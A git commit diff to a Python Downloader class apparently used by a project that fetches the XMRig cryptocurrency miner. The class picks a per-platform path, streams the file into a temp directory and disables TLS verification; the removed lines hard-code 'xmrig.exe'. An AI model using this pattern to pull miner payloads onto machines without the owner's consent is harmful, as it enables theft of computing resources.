0558d9a2d85ed3b1be53f1618697c4a7e973471e
Vbrawl <greninjagr@gmail.com>
2023-05-03 16:04:16 +0300

    Moved some configurable values to config class.

--- lib/Downloader.py
+++ lib/Downloader.py
@@ -4,14 +4,11 @@ from lib.TempManager import TempManager
 
 
 class Downloader:
-    URL = "http://localhost:8080"
     NAMESPACE = "/"
-    MINER_PATH = "xmrig.exe"
-    CONFIG_PATH = "config.json"
-    CHUNK_SIZE = 1024
 
-    def __init__(self, CHUNK_SIZE = None):
-        if CHUNK_SIZE: self.CHUNK_SIZE = CHUNK_SIZE
+    def __init__(self, server_address:str, chunk_size:int):
+        self.server_address = server_address
+        self.chunk_size = chunk_size
 
         NAMESPACE_MAP = {
             "WINDOWS": "W",
@@ -21,21 +18,15 @@ class Downloader:
 
         self.NAMESPACE = f"/{NAMESPACE_MAP[platform.system().upper()]}{platform.architecture()[0][:2]}/"
     
-    def _download(self, file:str) -> str:
+    def download(self, file:str) -> str:
         filepath = TempManager.get_path(file)
 
-        r = requests.get(self.URL + self.NAMESPACE + file, stream=True, timeout=30, verify=False)
+        r = requests.get(self.server_address + self.NAMESPACE + file, stream=True, timeout=30, verify=False)
         f = TempManager.open_file(filepath, 'wb')
 
-        for chunk in r.iter_content(self.CHUNK_SIZE):
+        for chunk in r.iter_content(self.chunk_size):
             if chunk:
                 f.write(chunk)
         
         f.close()
         return filepath
-
-
-
-if __name__ == "__main__":
-    dd = Downloader()
-    dd._download(dd.MINER_PATH)
